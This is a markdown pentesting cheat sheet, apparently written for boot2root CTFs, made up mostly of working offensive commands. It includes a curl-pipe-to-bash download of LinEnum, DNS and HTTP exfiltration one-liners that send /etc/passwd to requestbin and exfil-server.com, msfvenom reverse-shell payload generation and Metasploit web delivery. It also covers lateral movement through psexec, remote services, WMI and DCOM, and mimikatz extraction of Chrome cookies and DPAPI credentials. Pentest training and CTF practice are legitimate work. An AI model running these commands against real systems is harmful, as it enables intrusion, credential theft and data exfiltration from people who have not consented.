# Enumeration

Useful host enumeration snippets for boot2root-style CTFs.

## Remote Host Enumeration

### Port Scans

Nmap snippets for initial enumeration and situational awareness (`-sT` used for speed; in real-life scenarios, use TCP SYN scanning with `-sS`):

```sh
export HOST=scanme.nmap.org

# Quick TCP port scan on common ports.
nmap -vv -n -Pn -sT -sV -sC --top-ports 1000 -oN $'nmap.tcp.quick.'${HOST}$'.'$(date -Iseconds) $HOST

# Thorough and complete TCP port scan on all ports.
nmap -vv -n -Pn -sT -sV -sC -p- -oN $'nmap.tcp.thorough.'${HOST}$'.'$(date -Iseconds) $HOST

# UDP scan.
nmap -vv -n -Pn -sV -sC -sU -oN $'nmap.udp.'${HOST}$'.'$(date -Iseconds) $HOST

# Subnet scan, including a ping sweep.
nmap -vv -n -sT 10.10.10.0/24

# Subnet scan without a ping sweep.
nmap -vv -n -Pn -sT 10.10.10.0/24
```

### HTTP Enumeration

#### Directory Scanning

[`gobuster`](https://github.com/OJ/gobuster) is the go-to tool for HTTP directory enumeration. Here's a good standard one-liner to get started:

```sh
export URL=http://scanme.nmap.org/
gobuster dir --useragent 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 32 -u $URL | tee $'gobuster.'$(date -Iseconds)
```

Don't forget to add `-x php,xhtml`-style arguments based on any determined common file extensions.

If you just want to look for some quick-and-easy wins, this `curl` snippet will get you started:

```sh
export URL=http://scanme.nmap.org
for path in robots.txt sitemap.xml security.txt .git/HEAD; do curl -vv -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' $URL/$path; done
```

If you have some known file names, you can generate permutations of "backup" versions of these files with the following:

```sh
export FILES='one two three'
python3 -c "from itertools import product as p; print('\n'.join(a+b for a,b in p(__import__('os').getenv('FILES').split(),(c+d for c,d in p(['.bak','.swp','.backup','.txt'],['','~','.tgz','.zip','.tar.gz','.gz'])))))"
```

#### Web Application Firewall (WAF) Detection

[wafw00f](https://github.com/EnableSecurity/wafw00f) should be your go-to tool for WAF detection and fingerprinting. It has pretty straightforward usage:

```sh
export URL=http://scanme.nmap.org
wafw00f $URL
```

#### Fuzzing HTTP Parameters and Fields

Your friends for HTTP fuzzing wordlists will be the [SecLists](https://github.com/danielmiessler/SecLists) and [FuzzDB](https://github.com/fuzzdb-project/fuzzdb) projects. The best open source HTTP fuzzing engine that I know of is the [wfuzz project](https://github.com/xmendez/wfuzz). Here are some useful snippets combining these two awesome projects:

```sh
export URL=http://scanme.nmap.org

# fuzzing a URL parameter
wfuzz -c -z file,/opt/SecLists/Fuzzing/special-chars.txt -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' --hc 404 $URL/FUZZ

# fuzzing the user-agent; -H works for any other header, too
wfuzz -c -z file,/opt/SecLists/Fuzzing/User-Agents/UserAgents.fuzz.txt -H 'User-Agent: FUZZ' --hc 403,404  $URL

# fuzzing a POST login form with multiple parameters
wfuzz -c -z file,/opt/fuzzdb/wordlists-user-passwd/names/namelist.txt -z file,/opt/fuzzdb/wordlists-user-passwd/passwds/john.txt -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -d 'username=FUZZ&password=FUZ2Z' --hc 403 $URL/wp-login.php

# fuzzing HTTP verbs
wfuzz -c -z file,/opt/fuzzdb/attack/http-protocol/http-protocol-methods.txt -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -X FUZZ --hc 403 $URL
```

## Local Host Enumeration

This section goes over some automated methods. For manual checks, take a look at [my other pentesting snippet reference](https://pages.brianwel.ch/hacks).

### Automated Scripts

Projects like [LinEnum](https://github.com/rebootuser/LinEnum) are great for automating tedious privilege escalation checks. Here is a snippet for downloading and running from the public web:

```sh
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

### Process Watching

A lot of information can be gleaned by watching changes to [procfs](https://en.wikipedia.org/wiki/Procfs). An amazing tool for automating this is [`pspy`](https://github.com/DominicBreuker/pspy).

## File Exfiltration

### DNS Exfiltration

When outbound rules from a target are restrictive, it may still be possible to exfiltrate data via DNS. The awesome site [requestbin.net](requestbin.net) has support for [receiving DNS queries](http://requestbin.net/dns), too. By encoding the data-to-exfil within the subdomain field of a domain we control (through a service like requestbin), we can send pretty much data back to ourselves. requestbin alternatives include:

* [DNSBin](http://dnsbin.zhack.ca)

These concepts are based on [this writeup from Insomnihack Teaser 2020](https://ctftime.org/writeup/17998). I present below a proof-of-concept DNS exfiltration protocol with the following fields:

* N-byte 0-indexed sequence number
* 2-byte session
* N-byte data field
* The remainer of the requestbin domain (something like `.bf6c4b6d8f1b164d5c4d.d.requestbin.net`)

Some restrictions are inherited from the DNS specification:

* Each label (i.e., `www` and `company` from `www.company.com`) cannot exceed 63 characters
* The total length of the domain cannot exceed 253 characters

The below one-liners provide mechanisms of generating a `/tmp/resolveme` file that encodes the desired payload into a series of domains that use this basic protocol. The only step that remains after generating this file is to execute the DNS queries that create the exfiltration traffic. Take note that these one-liners also generate the session bytes inline; if space is at a premium, you can do this offline and harcode it in the commands. Another implementation of the below snippets is that they provide a 5-character space for the sequence number; exfils involving larger sequences may have to adjust this logic.

```sh
# Python 2/3 file read with compression; use `./python3-dns-bin-retriever -d zlib -t TOKEN` to retrieve from dnsbin.
python -c "s='.%02x'%__import__('random').getrandbits(8);d='.8f85be7ebfc30f73ebe5.d.requestbin.net';open('/tmp/resolveme','w').write('\n'.join(str(i)+s+'.'+x+d for i,x in enumerate(__import__('textwrap').fill(__import__('binascii').hexlify(__import__('zlib').compress(open('/etc/passwd','rb').read())).decode(),min(63,245-len(s)-len(d))).splitlines())))"

# python 2/3 command exec with compression; use `./python3-dns-bin-retriever -d zlib -t TOKEN` to retrieve from dnsbin.
python3 -c "s='.%02x'%__import__('random').getrandbits(8);d='.e004d291fe96f8880232.d.requestbin.net';open('/tmp/resolveme','w').write('\n'.join(str(i)+s+'.'+x+d for i,x in enumerate(__import__('textwrap').fill(__import__('binascii').hexlify(__import__('zlib').compress(__import__('subprocess').check_output('ls -la 2>&1',shell=True))).decode(),min(63,245-len(s)-len(d))).splitlines())))"

# Bash file read with compression; use `./python3-dns-bin-retriever -d gzip -t TOKEN` to retrieve from dnsbin.
rm /tmp/resolveme; d='.17ccedcf3f3294a6cbcc.d.requestbin.net';i=0;sess=$(xxd -l 1 -p /dev/urandom); <data.txt gzip -c | xxd -c 31 -p | while read l; do echo $i.$sess.$l$d >> /tmp/resolveme; let i++; done
```

And then sending that data from the target to your dnsbin listener:

```sh
# dig-powered name resolution.
dig -f /tmp/resolveme

# nslookup-powered name resolution
while read d; do nslookup $d; done </tmp/resolveme
```

While data can be manually retrieved and decoded/decompressed from requestbin, it might be useful to setup an automated retriever. See my [dnsbin retriever](../scripts/exfil/python3-dnsbin-retriever.py) script for a ready-to-go solution.

### HTTP File Exfiltration

A convenient method of transferring back to yourself is through HTTP POSTs using an existing HTTP client like `curl`. This can also be paired with a service like [ngrok](https://ngrok.com/) if you just want to transfer files over the public internet.

#### Server-side

Using PHP's `-S` standalone server mode, it is pretty simple to accept client file-upload requests. More information about the PHP builtin web server available [here](https://www.php.net/manual/en/features.commandline.webserver.php). You can grab a copy of my POSTed-file-accepting PHP server in the [`scripts/web`](../scripts/web) directory.

#### Client-side

The simplest way of uploading files from the client side is to POST them with `curl`:

```sh
curl -vv -A 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36' -F 'f=@/etc/passwd' http://exfil-server.com:8888
```

#### Tunnelling Over the Public Internet

Sometimes you can't communicate directly back to your attack machine from the target, but the target *can* touch the public internet. The following services will come in handy for quickly setting up listeners on the public internet:

* [ngrok](https://ngrok.com/): Free service that lets you expose HTTP and TCP ports on your machine on an `*.ngrok.io` domain on the public web. Probably the best option in this list.
* [requestbin](http://requestbin.net/): Free service for receiving HTTP requests. More useful for SSRF or XSS challenges where you do not need to control the application server talking back to the target. This site also provides [dnsbin](http://requestbin.net/dns).

### SMB File Exfiltration

Host files from a Kali workstation with:

```sh
mkdir smb-files
impacket-smbserver -smb2support MySmbTransferShare ./smb-files
```

### FTP File Exfiltration

If you can reach a target that has an FTP server, you probably want those files. In the event you are trying to exfil from a host that does not have a native FTP client, but has Python, the following script provides a solution:

```python
import sys
from ftplib import FTP

HOST = "10.10.10.10"
USER, PASS = "anonymous", "anonymous@"

FILES_TO_EXFIL = [
    "secret-data.txt",
    "another-script.py",
]

ftp = FTP(HOST)
ftp.login(USER, PASS)
ftp.retrlines("LIST")

for f in FILES_TO_EXFIL:
    sys.stdout.write(ftp.retrbinary("RETR " + f, open(f, "wb").write) + "\n")

ftp.quit()
```

You might want to turn this script into a one-line shell command. If so, check out [my one-liner-izing script](../scripts/encoding/any-python-one-liner-ize.py).

## Internal Network Enumeration

### Meterpreter Payload Generation

Here are some snippets for generating common meterpreter payloads:

```sh
export LISTEN_IP='10.10.10.10'
export LISTEN_PORT='443'

# Linux 64-bit reverse shell meterpreter.
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f elf > "reverse-shell_x86-64_${LISTEN_IP}_${LISTEN_PORT}.elf"

# Linux 32-bit reverse shell meterpreter.
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f elf > "reverse-shell_x86_${LISTEN_IP}_${LISTEN_PORT}.elf"

# Linux 64-bit bind shell meterpreter.
msfvenom -p linux/x64/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f elf > "bind-shell_x86-64_${LISTEN_PORT}.elf"

# Linux 32-bit bind shell meterpreter.
msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f elf > "bind-shell_x86_${LISTEN_PORT}.elf"

# Windows 64-bit reverse shell meterpreter.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f exe > "reverse-shell_x86-64_${LISTEN_IP}_${LISTEN_PORT}.exe"

# Windows 32-bit reverse shell meterpreter.
msfvenom -p windows/x86/meterpreter/reverse_tcp LHOST=$LISTEN_IP LPORT=$LISTEN_PORT -f exe > "reverse-shell_x86_${LISTEN_IP}_${LISTEN_PORT}.exe"

# Windows 64-bit bind shell meterpreter.
msfvenom -p windows/x64/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f exe > "bind-shell_x86-64_${LISTEN_PORT}.exe"

# Windows 32-bit bind shell meterpreter.
msfvenom -p windows/x86/meterpreter/bind_tcp LHOST=0.0.0.0 LPORT=$LISTEN_PORT -f exe > "bind-shell_x86_${LISTEN_PORT}.exe"
```

When ready, set up a meterpreter listener/connector using something like the following metasploit command:

```
handler -H 10.10.10.10 -P 443 -p windows/x64/meterpreter/bind_tcp
```

### Routing through Sessions

If you have a meterpreter session on a jump point in the network, you can have tools implicitly route their traffic through that point by adding a routing rule in metasploit:

```sh
# Make traffic to the 10.10.10.0/24 subnet route through session 1.
route add 10.10.10.0/24 1
```

### Meterpreter Port Scanning

For TCP port scans from a meterpreter session, use the following:

```
use auxiliary/scanner/portscan/tcp
set rhosts 10.10.10.10
set ports 1-65535
```

This is especially useful when routing through existing meterpreter sessions.

### Web Delivery

The [web delivery Metasploit module](https://www.offensive-security.com/metasploit-unleashed/web-delivery/) can be useful for executing meterpreter agents on target in-memory when you can run commands but don't have a great interactive environment yet:

```sh
use exploit/multi/script/web_delivery

# Adjust payload as necessary.
set payload windows/meterpreter/reverse_tcp
set LHOST 0.0.0.0
set LPORT 1337

# For in-memory PowerShell payload.
set payload PSH

# For PowerShell payload that gets dropped to disk.
set payload PSH (Binary)

# Run the module. This will host the final payload on an HTTP server, print the
# command to be run on target to download and execute the payload, and run the
# payload module for the final connection (i.e., start a listener for a reverse
# TCP payload).
run
```

### Ping Subnet Scanning

If you don't care about being too loud, this `ping` snippet is a quick-and-dirty way of detecting adjacent hosts on your subnet:

```sh
export SUBNET=192.168.33
for i in {1..254}; do (ping $SUBNET.$i -c 1 -w 5  >/dev/null && echo "$SUBNET.$i" &); done
```

## Windows Pivoting/Tooling

### File System Enumeration

To find files by their modification date, you can use filters like `datemodified:last week` or `datemodified:yesterday` in File Explorer.

Recursively searching for needle strings in files can be done in PowerShell:

```powershell
# Get files that contain the needle string.
Get-ChildItem -Recurse | Select-String "needle" -List | Select Path
```

And from a native `cmd.exe` shell (as explained [here](https://stackoverflow.com/a/699283)):

```bat
findstr /spin /c:"needle" [files]
```

### Interacting with Native Protocols

#### SMB

Using native Windows utilities:

```bat
:: Basic check to see if we have administrator access to the remote machine.
dir \\HOST\C$
```

[`PsExec.exe`](https://docs.microsoft.com/en-us/sysinternals/downloads/psexec), with admin privileges, lets you open shells on other Windows boxes:

```bat
psexec.exe -accepteula \\10.10.10.10 cmd.exe
```

[`smbmap.py`](https://github.com/ShawnDEvans/smbmap) also can automate a few SMB enumeration tasks from a Linux workstation:

```sh
# Show access to drives.
smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10

# List files in a directory.
smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10 -r 'C$\Users'

# Execute a command.
smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10 -x 'whoami'

# Download/upload files.
smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10 --download 'C$\temp\file.txt'
smbmap -u 'MyUsername' -p 'MyPassword' -H 10.10.10.10 --upload './local/payload.exe' 'C$\temp\upload.exe'
```

Impacket's [`smbexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py) and [`smbclient.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbclient.py) provide similar tooling:

```sh
# smbexec.py differs slightly from psexec.py in the way that output is captured. Since
# output is written to and read from an SMB share folder, we also have the option of
# hosting a server locally and having command output written to / read from our attack
# machine (requring root to listen on port 445).
impacket-smbexec MyDomain/MyUsername:MyPassword@10.10.10.10
sudo impacket-smbexec -mode SERVER MyDomain/MyUsername:MyPassword@10.10.10.10

# smbclient.py gives an semi-interactive shell capable of interacting with the remote
# file system and querying other information.
impacket-smbclient MyDomain/MyUsername:MyPassword@10.10.10.10
```

[`winexe`](https://tools.kali.org/maintaining-access/winexe) is yet another option from a Linux workstation:

```sh
winexe -U 'MyUsername%MyPassword' //10.10.10.10 'hostname'
```

We can also kick off payloads by creating and starting a service on a remote machine:

```bat
copy payload.exe \\10.10.10.10\C$\windows\temp
sc \\10.10.10.10 create MyService binpath= "C:\windows\temp\payload.exe"
sc \\10.10.10.10 start MyService

:: We need to migrate out of the service process relatively quickly; consequently,
:: we should probably be using a meterpreter payload and configure a handler to
:: auto-migrate:
use exploit/multi/handler
set LHOST 10.10.10.11
set LPORT 31337
set PAYLOAD windows/meterpreter/reverse_tcp
set AutoRunScript post/windows/manage/migrate
execute -j
```

#### PowerShell Remoting and WinRM

Helpful resources for WinRM and PS remoting can be found in [a look under the hood at PowerShell Remoting through a cross platform lens](http://www.hurryupandwait.io/blog/a-look-under-the-hood-at-powershell-remoting-through-a-ruby-cross-plaform-lens).

Using raw WinRM to run commands on other machines:

```bat
:: Specify protocol and port.
winrs.exe -r:http://10.10.10.10:5985 -u:MyUsername -p:MyPassword whoami

:: Or just specify the hostname.
winrs.exe -r:MyName.MyDomain -u:MyUsername -p:MyPassword whoami
```

Using PowerShell remoting to gain interactive sessions on remote machines (useful discussion can be found [here](https://www.ired.team/offensive-security/lateral-movement/t1028-winrm-for-lateral-movement) and [here](https://adamtheautomator.com/psremoting/)):

```powershell
# May need to enable remoting and add our attack machine as a trusted host.
Enable-PSRemoting -Force
# The below will make everything a trusted host; after this changed is applied, the
# WinRM service must be restarted.
Set-Item wsman:localhostclienttrustedhosts *
Restart-Service WinRM

# Check for WinRM listeners on a box you want to connect to (from that box).
winrm e winrm/config/listener

# Check if a remote session is listening and accessible on the default WinRM
# port (from your attack machine).
Test-NetConnection 10.10.10.10 -CommonTCPPort WINRM

# Enter a new PowerShell remoting session.
Enter-PSSession 10.10.10.10

# Enter a new session with specified credentials/authentication mechanism.
$cred = Get-Credential
Enter-PSSession 10.10.10.10 -Credential $cred
Enter-PSSession 10.10.10.10 -Credential MyDomain\MyUsername
Enter-PSSession 10.10.10.10 -Authentication Kerberos

# Show sessions.
Get-PSSession

# Upload/download files to/from remote session.
Copy-Item -Path \temp\payload.exe -Destination \temp -ToSession $sess
Copy-Item -Path C:\Users\Dummy\Desktop\juicy.txt -Destination \loot -FromSession $sess
```

#### WMI

WMI allows for some remote management options natively from Windows (with admin access on target machines). Some PowerShell examples:

```powershell
# Check to see if we have administrator access to the machine.
Get-WMIObject -Class win32_operatingsystem -Computername 10.10.10.10
```

Some examples from `cmd.exe`:

```bat
:: Execute a binary on another machine.
wmic /node:10.10.10.10 process call create payload.exe
```

From a Linux workstation, Impacket's [`wmiquery.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiquery.py) and [`wmiexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py) provide some query and execution tooling:

```sh
# Query users on a system.
impacket-wmiquery MyDomain/MyUsername:MyPassword@10.10.10.10
# Enter a query like: Select * from Win32_UserAccount

# Query event filter related entities.
impacket-wmiquery --namespace //./root/subscription MyDomain/MyUsername:MyPassword@10.10.10.10
# Enter a queries like:
# Select * from __EventFilter
# Select * from CommandLineEventConsumer
# Select * from __FilterToConsumerBinding

# Pop an interactive session on a target.
impacket-wmiexec MyDomain/MyUsername:MyPassword@10.10.10.10
```

See [Hunting for Impacket](https://riccardoancarani.github.io/2020-05-10-hunting-for-impacket/) for a blue team perspective on identifying the use of these tools.

#### DCOM

Useful resources:

* [Lateral movement using the MMC20.Application COM Object](https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/)
* [Lateral movement via DCOM round 2](https://enigma0x3.net/2017/01/23/lateral-movement-via-dcom-round-2/)
* [New lateral movement techniques abuse DCOM technology](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)

DCOM presents a protocol that can allow for command execution over remote application-specific channels (sometimes not requiring admin access to targets):

```powershell
$target = "10.10.10.10"

# Execute a command via the MMC20.Application COM object.
$com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application", $target))
$com.Document.ActiveView.ExecuteShellCommand("C:\temp\payload.exe", $null, "-cmd -line -args", "7")
```

This process can also be performed from a Linux workstation via [`dcomexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dcomexec.py):

```sh
# Supported objects: MMC20, ShellWindows, ShellBrowserWindow.
impacket-dcomexec -object MMC20 MyDomain/MyUser:MyPassword@10.10.10.10
```

#### Other Useful Impacket Scripts

The following Impacket scripts also provide useful remote query capabilities (some example use can be found [here](https://www.hackingarticles.in/impacket-guide-smb-msrpc/)):

* [`GetADUsers.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetADUsers.py)
* [`GetUserSPNs.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py)
* [`atexec.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
* [`dpapi.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/dpapi.py)
* [`ntlmrelayx.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py)
* [`registry-read.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/registry-read.py)
* [`smbrelayx.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbrelayx.py)
* [`services.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/services.py)

### Passing the Hash

[This Cobalt Strike blog post](https://blog.cobaltstrike.com/2015/05/21/how-to-pass-the-hash-with-mimikatz/) talks through a use case to pass the hash to gain a different token for a local process, which can then be used to interact with different remote systems under the context of a different user.

TODO

### Active Directory Enumeration

TODO

### Kerbeos

TODO

#### NTLM Relaying

TODO

### File System Enumeration

TODO

### PowerShell Empire

Useful cheatsheet can be found [here](https://github.com/HarmJ0y/CheatSheets/blob/master/Empire.pdf).

### Pillaging Credentials

#### Pillaging Offline

[`secretsdump.py`](https://github.com/SecureAuthCorp/impacket/blob/master/examples/secretsdump.py) can be used to dump hashes from , both over the network and offline from hive files.

```sh
TODO
```

Guide on dumping Windows credential files and dumping hashes from them offline with `secretsdump.py` can be found [here](https://airman604.medium.com/dumping-active-directory-password-hashes-deb9468d1633).

#### DPAPI Fun with Mimikatz

[DPAPI](https://www.harmj0y.net/blog/redteaming/operational-guidance-for-offensive-user-dpapi-abuse/) credential decryption; in user-mode, DPAPI provides a set of encryption/decryption routines using a master key derived from a user's password. This is used by things like Chrome to encrypt cookies and saved logins (`harmj0y` link provides details on this).

For example, the following mimikatz command will list out Chrome's stored cookie names and associated domains (the lack of a provided password means the actual values cannot be decrypted):

```bat
:: List out cookies.
dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Cookies”

:: If executing in the context of the user that "owns" those cookies, we can decrypt without the password.
dpapi::chrome /in:”%localappdata%\Google\Chrome\User Data\Default\Cookies” /unprotect
```

It may be possible to dump the DPAPI keys for other logged in users via the following:

```bat
sekurlsa::dpapi
```

Finally, we can also derive a user's master key itself through the following (requires the user's password):

```bat
mkdir .\workspace

:: Get user's SID and needed files from subdirectory listed in below directory.
dir \users\security\appdata\roaming\microsoft\protect
copy \users\security\appdata\roaming\microsoft\protect\<SID>\<HEX FILENAME> .\workspace

:: Now, in mimikatz shell, use dpapi command to get the masterkey.
dpapi::masterkey /in:<HEX FILENAME> /sid:<SID> /password:<USER'S PASSWORD>
:: This should display the masterkey, which is also stored the mimikatz session. If we
:: can't make use of a continous mimikatz session, then DPAPI keys can be specified in
:: commands with the /masterkey option. This cache can always be viewed with
:: dpapi::cache.

:: Now, we can decrypt encrypted credentials like:
dpapi::cred /in:<FILENAME>
```

Also see [the mimikatz wiki article on decrypting Credential Manager stored credentials](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials). The `harmj0y` post linked above also goes into detail about more advanced domain techniques.

## Common Windows Vulnerabilities

TODO

### Zerologon

POC is available [here](https://github.com/bb00/zer0dump).

## Linux Pivoting/Tooling

### File System Enumeration

Find the most recently changed files on the file system (alternative methods discussed [here](https://stackoverflow.com/a/7448828)):

```sh
find /start-directory -type f -print0 | xargs -0 stat --format '%Y :%y %n' | sort -nr | cut -d: -f2-
```

Find files affected by ACLs (as explained [here](https://superuser.com/questions/398448/find-files-with-acls-set)):

```sh
getfacl -R -s -p /directory | sed -n 's/^# file: //p'
```

## Bruteforcing and Spraying Creds

### Bruteforcing

TODO

### Spraying

TODO: cme?
